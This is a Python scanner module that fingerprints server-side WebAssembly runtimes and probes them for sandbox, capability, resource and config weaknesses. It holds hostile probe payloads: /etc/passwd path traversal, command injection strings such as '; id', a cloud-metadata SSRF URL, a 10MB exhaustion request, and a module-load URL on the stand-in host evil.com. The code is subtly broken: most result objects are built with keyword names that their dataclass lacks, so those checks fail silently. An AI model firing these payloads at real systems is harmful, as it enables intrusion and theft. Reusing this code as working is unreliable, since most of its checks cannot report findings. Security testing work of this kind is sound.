"""
WASM Backend Security Scanner v1.0

Tests server-side WebAssembly runtimes for security vulnerabilities:
- Wasmtime, Wasmer, WasmEdge, WAMR detection
- WASI capability exposure
- Sandbox escape indicators
- Memory/resource limits
- Module loading vulnerabilities
- Capability-based security bypass

LOW Priority - 4 days effort

CWE Coverage:
- CWE-250: Execution with Unnecessary Privileges
- CWE-269: Improper Privilege Management
- CWE-284: Improper Access Control
- CWE-400: Uncontrolled Resource Consumption
- CWE-693: Protection Mechanism Failure

Bug Bounty Value: $1,000 - $10,000 for sandbox escapes
Reference: Server-side WASM is emerging technology with limited security research
"""

from __future__ import annotations

import asyncio
import re
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import TYPE_CHECKING, Any
from urllib.parse import urljoin

import httpx

from scanning.findings import Finding, Severity, VulnType
from scanning.vuln_scanner import ScanModule
from utils.logger import get_logger
from utils.http_client import create_protected_client, get_configured_ssl_verify
from scanning.scan_context import ScanContext

if TYPE_CHECKING:
    from utils.rate_limiter import RateLimiter

logger = get_logger(__name__)

WASM_BACKEND_SCANNER_VERSION = "1.0.0"


class WASMBackendVulnType(Enum):
    """Types of WASM backend vulnerabilities."""
    RUNTIME_DETECTION = auto()       # Runtime fingerprinting
    WASI_OVEREXPOSURE = auto()       # Excessive WASI capabilities
    SANDBOX_WEAKNESS = auto()        # Sandbox escape indicators
    RESOURCE_EXHAUSTION = auto()     # Memory/CPU limits missing
    MODULE_INJECTION = auto()        # Arbitrary module loading
    CAPABILITY_BYPASS = auto()       # Capability-based security bypass
    CONFIG_EXPOSURE = auto()         # Runtime configuration leaked
    MEMORY_DISCLOSURE = auto()       # Memory content leakage


class WASMRuntime(Enum):
    """Known WASM runtimes."""
    WASMTIME = "wasmtime"
    WASMER = "wasmer"
    WASMEDGE = "wasmedge"
    WAMR = "wamr"                    # WebAssembly Micro Runtime
    WASMCLOUD = "wasmcloud"
    SPIN = "spin"                    # Fermyon Spin
    LUNATIC = "lunatic"
    WAZERO = "wazero"                # Go-based
    NODE_WASM = "node_wasm"          # Node.js WASM
    UNKNOWN = "unknown"


@dataclass
class WASMBackendEndpoint:
    """Detected WASM backend endpoint."""
    url: str
    runtime: WASMRuntime
    version: str = ""
    wasi_capabilities: list[str] = field(default_factory=list)
    detected_via: str = ""


@dataclass
class WASMBackendTestResult:
    """Result of a WASM backend security test."""
    vulnerable: bool
    vuln_type: WASMBackendVulnType
    confidence: int
    runtime: WASMRuntime
    evidence: list[str] = field(default_factory=list)
    severity: str = "MEDIUM"
    cwe: str = "CWE-250"
    exposed_capabilities: list[str] = field(default_factory=list)


# Runtime detection patterns
RUNTIME_FINGERPRINTS = {
    WASMRuntime.WASMTIME: {
        "headers": [
            ("x-wasmtime-version", r".*"),
            ("server", r"wasmtime"),
        ],
        "errors": [
            r"wasmtime::",
            r"wasmtime_runtime",
            r"cranelift",
            r"wasm trap",
        ],
        "features": ["component model", "wit"],
    },
    WASMRuntime.WASMER: {
        "headers": [
            ("x-wasmer-version", r".*"),
            ("server", r"wasmer"),
        ],
        "errors": [
            r"wasmer::",
            r"wasmer_runtime",
            r"RuntimeError: Out of bounds",
        ],
        "features": ["wasix", "wcgi"],
    },
    WASMRuntime.WASMEDGE: {
        "headers": [
            ("x-wasmedge-version", r".*"),
            ("server", r"wasmedge"),
        ],
        "errors": [
            r"wasmedge::",
            r"WasmEdge",
            r"wasi-nn",
        ],
        "features": ["wasi-nn", "wasi-crypto"],
    },
    WASMRuntime.SPIN: {
        "headers": [
            ("server", r"spin"),
            ("x-spin-version", r".*"),
        ],
        "errors": [
            r"spin::",
            r"fermyon",
            r"spin_sdk",
        ],
        "features": ["spin trigger", "key-value"],
    },
    WASMRuntime.WASMCLOUD: {
        "headers": [
            ("server", r"wasmcloud"),
            ("x-wasmcloud-", r".*"),
        ],
        "errors": [
            r"wasmcloud::",
            r"capability provider",
            r"actor",
        ],
        "features": ["capability", "actor model"],
    },
    WASMRuntime.LUNATIC: {
        "headers": [
            ("server", r"lunatic"),
        ],
        "errors": [
            r"lunatic::",
            r"process supervision",
        ],
        "features": ["erlang-style"],
    },
    WASMRuntime.WAZERO: {
        "headers": [],
        "errors": [
            r"wazero::",
            r"wazero/api",
        ],
        "features": ["pure go"],
    },
}

# WASI capabilities that indicate potential security issues
WASI_DANGEROUS_CAPABILITIES = {
    "filesystem": {
        "severity": "HIGH",
        "description": "Full filesystem access",
        "indicators": ["fd_prestat_get", "path_open", "fd_read", "fd_write"],
    },
    "network": {
        "severity": "HIGH",
        "description": "Network socket access",
        "indicators": ["sock_accept", "sock_connect", "sock_send", "sock_recv"],
    },
    "process": {
        "severity": "CRITICAL",
        "description": "Process spawning capability",
        "indicators": ["proc_raise", "proc_exit", "sched_yield"],
    },
    "random": {
        "severity": "LOW",
        "description": "Random number generation",
        "indicators": ["random_get"],
    },
    "clock": {
        "severity": "LOW",
        "description": "Clock/time access",
        "indicators": ["clock_time_get", "clock_res_get"],
    },
    "env": {
        "severity": "MEDIUM",
        "description": "Environment variable access",
        "indicators": ["environ_get", "environ_sizes_get"],
    },
    "args": {
        "severity": "LOW",
        "description": "Command line arguments",
        "indicators": ["args_get", "args_sizes_get"],
    },
}

# WASI extensions that may have security implications
WASI_EXTENSIONS = {
    "wasi-nn": {
        "description": "Neural network inference",
        "security_note": "May allow model extraction or inference manipulation",
    },
    "wasi-crypto": {
        "description": "Cryptographic operations",
        "security_note": "Key management and crypto operation exposure",
    },
    "wasi-http": {
        "description": "HTTP client capability",
        "security_note": "SSRF potential if not restricted",
    },
    "wasi-keyvalue": {
        "description": "Key-value store access",
        "security_note": "Data storage access",
    },
    "wasi-blob": {
        "description": "Blob storage access",
        "security_note": "File/blob storage access",
    },
    "wasi-messaging": {
        "description": "Message queue access",
        "security_note": "Inter-service communication",
    },
}


class WASMBackendScanner(ScanModule):
    """
    WASM Backend Security Scanner.

    Tests server-side WebAssembly runtimes:
    - Runtime detection and fingerprinting
    - WASI capability analysis
    - Sandbox escape testing
    - Resource limit verification
    - Module injection testing
    """

    name = "wasm_backend_scanner"
    version = WASM_BACKEND_SCANNER_VERSION
    category = "wasm"

    def __init__(
        self,
        settings: Any = None,
        *,
        findings_store: Any = None,
        rate_limiter: Any = None,
    ) -> None:
        super().__init__(settings, findings_store=findings_store, rate_limiter=rate_limiter)
        self.findings: list[dict[str, Any]] = []
        self.wasm_endpoints: list[WASMBackendEndpoint] = []
        self._ssl_verify = get_configured_ssl_verify()

    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any] | None = None,
        rate_limiter: RateLimiter | None = None,
    ) -> dict[str, Any]:
        """Execute WASM backend security scan."""
        asset_data = asset_data or {}

        # SCAN CONTEXT
        self._ctx = ScanContext(asset_data)
        self._auth_headers = self._ctx.auth_headers

        self.findings = []
        self.wasm_endpoints = []

        base_url = f"https://{host}" if not host.startswith("http") else host
        urls = asset_data.get("urls", [])

        logger.info(f"WASM Backend Scanner v{self.version} starting on {host}")

        client = create_protected_client(
            timeout=30.0,
            verify_ssl=self._ssl_verify,
            follow_redirects=True,
            custom_headers=self._auth_headers,
        )

        async with client:
            # Phase 1: Detect WASM backend runtime
            await self._detect_wasm_runtime(client, base_url, urls, rate_limiter)

            if not self.wasm_endpoints:
                logger.info("No WASM backend runtime detected")
                return {
                    "module": self.name,
                    "version": self.version,
                    "findings": [],
                    "wasm_backend_detected": False,
                }

            logger.info(f"Found {len(self.wasm_endpoints)} WASM backend endpoints")

            # Phase 2: Analyze WASI capabilities
            await self._analyze_wasi_capabilities(client, rate_limiter)

            # Phase 3: Test for sandbox weaknesses
            await self._test_sandbox_weakness(client, rate_limiter)

            # Phase 4: Test resource limits
            await self._test_resource_limits(client, rate_limiter)

            # Phase 5: Test module injection
            await self._test_module_injection(client, base_url, rate_limiter)

            # Phase 6: Test capability bypass
            await self._test_capability_bypass(client, rate_limiter)

            # Phase 7: Check for config exposure
            await self._check_config_exposure(client, base_url, rate_limiter)

        logger.info(f"WASM backend scan complete. Found {len(self.findings)} vulnerabilities")

        return {
            "module": self.name,
            "version": self.version,
            "findings": self.findings,
            "wasm_backend_detected": True,
            "endpoints": [
                {
                    "url": ep.url,
                    "runtime": ep.runtime.value,
                    "version": ep.version,
                    "wasi_capabilities": ep.wasi_capabilities,
                }
                for ep in self.wasm_endpoints
            ],
        }

    async def _detect_wasm_runtime(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter | None,
    ) -> None:
        """Detect WASM backend runtime via fingerprinting."""
        logger.debug("Phase 1: Detecting WASM backend runtime")

        # Test main URL first
        if rate_limiter:
            await rate_limiter.acquire()

        try:
            response = await client.get(base_url)
            runtime, version, detected_via = self._fingerprint_runtime(response)

            if runtime != WASMRuntime.UNKNOWN:
                self.wasm_endpoints.append(WASMBackendEndpoint(
                    url=base_url,
                    runtime=runtime,
                    version=version,
                    detected_via=detected_via,
                ))

                # Add informational finding about runtime detection
                result = WASMBackendTestResult(
                    vulnerable=False,
                    vuln_type=WASMBackendVulnType.RUNTIME_DETECTION,
                    confidence_score=80,
                    runtime=runtime,
                    evidence=[
                        f"WASM runtime detected: {runtime.value}",
                        f"Version: {version or 'unknown'}",
                        f"Detected via: {detected_via}",
                    ],
                    severity=Severity.INFO,
                )

                self._add_finding(
                    name=f"WASM Backend Runtime Detected ({runtime.value})",
                    description=(
                        f"Server uses {runtime.value} WebAssembly runtime. "
                        "Further analysis will test for WASI capability exposure and sandbox weaknesses."
                    ),
                    endpoint=base_url,
                    result=result,
                )

        except Exception as e:
            logger.debug(f"Runtime detection error: {e}")

        # Probe WASM-specific endpoints
        wasm_endpoints = [
            "/.well-known/wasm",
            "/api/wasm",
            "/wasm/",
            "/module",
            "/spin",
            "/actor",
            "/function",
            "/_wasm/",
        ]

        for ep_path in wasm_endpoints:
            if rate_limiter:
                await rate_limiter.acquire()

            url = urljoin(base_url, ep_path)
            try:
                response = await client.get(url)

                if response.status_code in [200, 404, 405]:
                    runtime, version, detected_via = self._fingerprint_runtime(response)

                    if runtime != WASMRuntime.UNKNOWN:
                        if not any(ep.url == url for ep in self.wasm_endpoints):
                            self.wasm_endpoints.append(WASMBackendEndpoint(
                                url=url,
                                runtime=runtime,
                                version=version,
                                detected_via=detected_via,
                            ))

            except Exception:
                pass

        # Check error responses for runtime leakage
        error_endpoints = [
            "/nonexistent12345",
            "/api/error",
            "/__debug__",
        ]

        for ep_path in error_endpoints:
            if rate_limiter:
                await rate_limiter.acquire()

            url = urljoin(base_url, ep_path)
            try:
                response = await client.get(url)
                runtime, version, detected_via = self._fingerprint_runtime(response)

                if runtime != WASMRuntime.UNKNOWN:
                    if not any(ep.runtime == runtime for ep in self.wasm_endpoints):
                        self.wasm_endpoints.append(WASMBackendEndpoint(
                            url=base_url,  # Main URL
                            runtime=runtime,
                            version=version,
                            detected_via=f"error response at {ep_path}",
                        ))

            except Exception:
                pass

    def _fingerprint_runtime(
        self,
        response: httpx.Response,
    ) -> tuple[WASMRuntime, str, str]:
        """Fingerprint WASM runtime from response."""
        headers = {k.lower(): v for k, v in response.headers.items()}
        body = response.text

        for runtime, fingerprint in RUNTIME_FINGERPRINTS.items():
            # Check headers
            for header_name, pattern in fingerprint.get("headers", []):
                if header_name in headers:
                    if re.search(pattern, headers[header_name], re.IGNORECASE):
                        version = headers.get(f"x-{runtime.value}-version", "")
                        return runtime, version, f"header:{header_name}"

            # Check error messages
            for error_pattern in fingerprint.get("errors", []):
                if re.search(error_pattern, body, re.IGNORECASE):
                    return runtime, "", f"error_pattern:{error_pattern[:20]}"

        return WASMRuntime.UNKNOWN, "", ""

    async def _analyze_wasi_capabilities(
        self,
        client: httpx.AsyncClient,
        rate_limiter: RateLimiter | None,
    ) -> None:
        """Analyze exposed WASI capabilities."""
        logger.debug("Phase 2: Analyzing WASI capabilities")

        for endpoint in self.wasm_endpoints:
            if rate_limiter:
                await rate_limiter.acquire()

            try:
                # Probe for capability-revealing endpoints
                capability_endpoints = [
                    f"{endpoint.url}?__wasi_caps",
                    f"{endpoint.url}?debug=capabilities",
                    f"{endpoint.url}/.wasi/capabilities",
                ]

                for cap_url in capability_endpoints:
                    response = await client.get(cap_url)

                    if response.status_code == 200:
                        body = response.text

                        # Check for WASI capability indicators
                        exposed_caps = []
                        dangerous_caps = []

                        for cap_name, cap_info in WASI_DANGEROUS_CAPABILITIES.items():
                            for indicator in cap_info["indicators"]:
                                if indicator in body.lower():
                                    exposed_caps.append(cap_name)
                                    if cap_info["severity"] in ["HIGH", "CRITICAL"]:
                                        dangerous_caps.append((cap_name, cap_info))
                                    break

                        if dangerous_caps:
                            endpoint.wasi_capabilities = exposed_caps

                            result = WASMBackendTestResult(
                                vulnerable=True,
                                vuln_type=WASMBackendVulnType.WASI_OVEREXPOSURE,
                                confidence_score=75,
                                runtime=endpoint.runtime,
                                evidence=[
                                    f"Dangerous WASI capabilities exposed: {[c[0] for c in dangerous_caps]}",
                                    "These capabilities may allow sandbox escape",
                                ] + [f"{c[0]}: {c[1]['description']}" for c in dangerous_caps],
                                severity=Severity.HIGH,
                                cwe_id="CWE-250",
                                exposed_capabilities=exposed_caps,
                            )

                            self._add_finding(
                                name="WASI Capability Overexposure",
                                description=(
                                    "WASM runtime exposes dangerous WASI capabilities. "
                                    "Capabilities like filesystem, network, or process access "
                                    "may allow sandbox escape if exploited."
                                ),
                                endpoint=endpoint.url,
                                result=result,
                            )
                            break

            except Exception as e:
                logger.debug(f"WASI capability analysis error: {e}")

        # Also check for WASI extension exposure
        for endpoint in self.wasm_endpoints:
            if rate_limiter:
                await rate_limiter.acquire()

            try:
                response = await client.get(endpoint.url)
                body = response.text

                exposed_extensions = []
                for ext_name, ext_info in WASI_EXTENSIONS.items():
                    if ext_name in body.lower():
                        exposed_extensions.append((ext_name, ext_info))

                if exposed_extensions:
                    result = WASMBackendTestResult(
                        vulnerable=True,
                        vuln_type=WASMBackendVulnType.WASI_OVEREXPOSURE,
                        confidence_score=65,
                        runtime=endpoint.runtime,
                        evidence=[
                            f"WASI extensions detected: {[e[0] for e in exposed_extensions]}",
                        ] + [f"{e[0]}: {e[1]['security_note']}" for e in exposed_extensions],
                        severity=Severity.MEDIUM,
                        cwe_id="CWE-284",
                    )

                    self._add_finding(
                        name="WASI Extension Exposure",
                        description=(
                            "WASM runtime exposes WASI extensions that may have security implications."
                        ),
                        endpoint=endpoint.url,
                        result=result,
                    )

            except Exception:
                pass

    async def _test_sandbox_weakness(
        self,
        client: httpx.AsyncClient,
        rate_limiter: RateLimiter | None,
    ) -> None:
        """Test for sandbox escape indicators."""
        logger.debug("Phase 3: Testing sandbox weaknesses")

        for endpoint in self.wasm_endpoints:
            if rate_limiter:
                await rate_limiter.acquire()

            try:
                # Payloads that might indicate sandbox weakness
                sandbox_test_payloads = [
                    # Path traversal via WASI
                    {"path": "/../../../etc/passwd"},
                    {"file": "file:///etc/passwd"},

                    # Environment variable access
                    {"env": "$HOME"},
                    {"var": "${PATH}"},

                    # Command injection via WASI proc
                    {"cmd": "; id"},
                    {"exec": "| cat /etc/passwd"},

                    # Network access
                    {"url": "http://169.254.169.254/"},
                    {"host": "localhost"},
                ]

                for payload in sandbox_test_payloads:
                    response = await client.post(endpoint.url, json=payload)

                    if response.status_code == 200:
                        body = response.text.lower()

                        # Check for sandbox escape indicators
                        escape_indicators = [
                            ("root:", "File system access outside sandbox"),
                            ("/home/", "Home directory access"),
                            ("uid=", "Command execution"),
                            ("ami-", "Cloud metadata access"),
                            ("instance-id", "Cloud metadata access"),
                        ]

                        for indicator, description in escape_indicators:
                            if indicator in body:
                                result = WASMBackendTestResult(
                                    vulnerable=True,
                                    vuln_type=WASMBackendVulnType.SANDBOX_WEAKNESS,
                                    confidence_score=85,
                                    runtime=endpoint.runtime,
                                    evidence=[
                                        f"Sandbox escape indicator: {description}",
                                        f"Payload: {payload}",
                                        f"Indicator found: {indicator}",
                                    ],
                                    severity=Severity.CRITICAL,
                                    cwe_id="CWE-693",
                                )

                                self._add_finding(
                                    name="WASM Sandbox Escape",
                                    description=(
                                        "WASM sandbox can be escaped via malicious input. "
                                        f"Type: {description}"
                                    ),
                                    endpoint=endpoint.url,
                                    result=result,
                                )
                                return  # One critical finding is enough

            except Exception as e:
                logger.debug(f"Sandbox test error: {e}")

    async def _test_resource_limits(
        self,
        client: httpx.AsyncClient,
        rate_limiter: RateLimiter | None,
    ) -> None:
        """Test for missing resource limits."""
        logger.debug("Phase 4: Testing resource limits")

        for endpoint in self.wasm_endpoints[:3]:
            if rate_limiter:
                await rate_limiter.acquire()

            try:
                # Memory exhaustion test
                large_payload = {"data": "A" * 10_000_000}  # 10MB

                start = time.time()
                try:
                    response = await client.post(
                        endpoint.url,
                        json=large_payload,
                        timeout=15.0,
                    )
                    elapsed = time.time() - start

                    # If accepted without limit
                    if response.status_code == 200 and elapsed < 5:
                        result = WASMBackendTestResult(
                            vulnerable=True,
                            vuln_type=WASMBackendVulnType.RESOURCE_EXHAUSTION,
                            confidence_score=60,
                            runtime=endpoint.runtime,
                            evidence=[
                                "Large payload (10MB) accepted without error",
                                f"Response time: {elapsed:.2f}s",
                                "Memory limits may be missing or too high",
                            ],
                            severity=Severity.MEDIUM,
                            cwe_id="CWE-400",
                        )

                        self._add_finding(
                            name="WASM Missing Memory Limits",
                            description=(
                                "WASM runtime accepts very large payloads without apparent limits. "
                                "This may allow memory exhaustion attacks."
                            ),
                            endpoint=endpoint.url,
                            result=result,
                        )

                except asyncio.TimeoutError:
                    # Timeout might indicate successful resource exhaustion
                    result = WASMBackendTestResult(
                        vulnerable=True,
                        vuln_type=WASMBackendVulnType.RESOURCE_EXHAUSTION,
                        confidence_score=55,
                        runtime=endpoint.runtime,
                        evidence=[
                            "Large payload caused timeout",
                            "WASM module may have been exhausted",
                        ],
                        severity=Severity.MEDIUM,
                        cwe_id="CWE-400",
                    )

                    self._add_finding(
                        name="WASM Resource Exhaustion",
                        description="Large payload caused WASM module to timeout.",
                        endpoint=endpoint.url,
                        result=result,
                    )

            except Exception as e:
                logger.debug(f"Resource limit test error: {e}")

    async def _test_module_injection(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter | None,
    ) -> None:
        """Test for arbitrary module loading vulnerabilities."""
        logger.debug("Phase 5: Testing module injection")

        # Endpoints that might load modules
        module_endpoints = [
            "/api/module/load",
            "/api/wasm/load",
            "/load",
            "/execute",
            "/run",
        ]

        for ep_path in module_endpoints:
            if rate_limiter:
                await rate_limiter.acquire()

            url = urljoin(base_url, ep_path)

            try:
                # Test module URL injection
                injection_payloads = [
                    {"module": "https://evil.com/malicious.wasm"},
                    {"wasm_url": "file:///etc/passwd"},
                    {"path": "http://169.254.169.254/"},
                    {"source": "data:application/wasm;base64,AGFzbQEAAAA="},
                ]

                for payload in injection_payloads:
                    response = await client.post(url, json=payload)

                    if response.status_code in [200, 201]:
                        body = response.text.lower()

                        # Check for successful module load indicators
                        if any(x in body for x in ["loaded", "success", "executed", "module"]):
                            result = WASMBackendTestResult(
                                vulnerable=True,
                                vuln_type=WASMBackendVulnType.MODULE_INJECTION,
                                confidence_score=70,
                                runtime=WASMRuntime.UNKNOWN,
                                evidence=[
                                    f"Module injection endpoint: {url}",
                                    f"Payload: {payload}",
                                    "Arbitrary module loading may be possible",
                                ],
                                severity=Severity.HIGH,
                                cwe_id="CWE-94",
                            )

                            self._add_finding(
                                name="WASM Module Injection",
                                description=(
                                    "Endpoint allows loading WASM modules from arbitrary sources. "
                                    "Attackers could load malicious modules for code execution."
                                ),
                                endpoint=url,
                                result=result,
                            )
                            break

            except Exception as e:
                logger.debug(f"Module injection test error: {e}")

    async def _test_capability_bypass(
        self,
        client: httpx.AsyncClient,
        rate_limiter: RateLimiter | None,
    ) -> None:
        """Test for capability-based security bypass."""
        logger.debug("Phase 6: Testing capability bypass")

        for endpoint in self.wasm_endpoints:
            if endpoint.runtime not in [WASMRuntime.WASMCLOUD, WASMRuntime.SPIN]:
                continue  # Only test capability-based runtimes

            if rate_limiter:
                await rate_limiter.acquire()

            try:
                # Test capability spoofing
                bypass_payloads = [
                    # Capability claim injection
                    {"capability": "wasmcloud:keyvalue"},
                    {"cap": "wasi:filesystem"},
                    {"provider": "admin"},

                    # Link manipulation
                    {"link": "internal-service"},
                    {"contract": "wasmcloud:httpserver"},
                ]

                for payload in bypass_payloads:
                    response = await client.post(endpoint.url, json=payload)

                    if response.status_code == 200:
                        body = response.text

                        # Check for capability grant indicators
                        if any(x in body.lower() for x in ["granted", "authorized", "linked", "success"]):
                            result = WASMBackendTestResult(
                                vulnerable=True,
                                vuln_type=WASMBackendVulnType.CAPABILITY_BYPASS,
                                confidence_score=65,
                                runtime=endpoint.runtime,
                                evidence=[
                                    f"Capability bypass attempt: {payload}",
                                    "Capability grant may be manipulable",
                                ],
                                severity=Severity.HIGH,
                                cwe_id="CWE-269",
                            )

                            self._add_finding(
                                name="WASM Capability Bypass",
                                description=(
                                    "Capability-based security may be bypassable. "
                                    "Actors might gain unauthorized capabilities."
                                ),
                                endpoint=endpoint.url,
                                result=result,
                            )
                            break

            except Exception as e:
                logger.debug(f"Capability bypass test error: {e}")

    async def _check_config_exposure(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter | None,
    ) -> None:
        """Check for WASM runtime configuration exposure."""
        logger.debug("Phase 7: Checking config exposure")

        config_endpoints = [
            "/.well-known/wasm-config",
            "/api/config",
            "/spin.toml",
            "/wasmcloud.toml",
            "/wasmer.toml",
            "/__config__",
            "/debug/config",
        ]

        for ep_path in config_endpoints:
            if rate_limiter:
                await rate_limiter.acquire()

            url = urljoin(base_url, ep_path)

            try:
                response = await client.get(url)

                if response.status_code == 200:
                    body = response.text

                    # Check for sensitive config indicators
                    sensitive_patterns = [
                        (r"secret[_-]?key\s*[:=]", "Secret key exposed"),
                        (r"api[_-]?key\s*[:=]", "API key exposed"),
                        (r"password\s*[:=]", "Password exposed"),
                        (r"allowed_hosts\s*[:=]\s*\*", "Wildcard host allowed"),
                        (r"wasi_caps\s*[:=]\s*all", "All WASI caps enabled"),
                        (r"sandbox\s*[:=]\s*false", "Sandbox disabled"),
                        (r"debug\s*[:=]\s*true", "Debug mode enabled"),
                    ]

                    found_issues = []
                    for pattern, issue in sensitive_patterns:
                        if re.search(pattern, body, re.IGNORECASE):
                            found_issues.append(issue)

                    if found_issues:
                        result = WASMBackendTestResult(
                            vulnerable=True,
                            vuln_type=WASMBackendVulnType.CONFIG_EXPOSURE,
                            confidence_score=80,
                            runtime=WASMRuntime.UNKNOWN,
                            evidence=[f"Config exposed at: {url}"] + found_issues,
                            severity=Severity.HIGH if "Secret" in str(found_issues) or "Password" in str(found_issues) else "MEDIUM",
                            cwe_id="CWE-200",
                        )

                        self._add_finding(
                            name="WASM Runtime Configuration Exposure",
                            description=(
                                f"WASM runtime configuration is exposed. "
                                f"Issues: {', '.join(found_issues)}"
                            ),
                            endpoint=url,
                            result=result,
                        )

            except Exception as e:
                logger.debug(f"Config exposure check error: {e}")

    def _add_finding(
        self,
        name: str,
        description: str,
        endpoint: str,
        result: WASMBackendTestResult,
    ) -> None:
        """Add a finding to the results."""
        finding = Finding(
            vuln_type=VulnType.OTHER,
            name=name,
            severity=result.severity,
            confidence_score=float(result.confidence),
            description=description,
            url=endpoint,
            endpoint=endpoint,
            evidence=result.evidence,
            metadata={
                "wasm_vuln_type": result.vuln_type.name,
                "runtime": result.runtime.value,
                "cwe": result.cwe,
                "exposed_capabilities": result.exposed_capabilities if result.exposed_capabilities else None,
            },
        )

        self.findings.append(finding.to_dict())

        logger.info(
            f"WASM backend vulnerability [{result.severity}]: {name} "
            f"| Runtime: {result.runtime.value} | Confidence: {result.confidence}%"
        )


# Export
__all__ = [
    "WASMBackendScanner",
    "WASMBackendVulnType",
    "WASMRuntime",
    "WASM_BACKEND_SCANNER_VERSION",
]
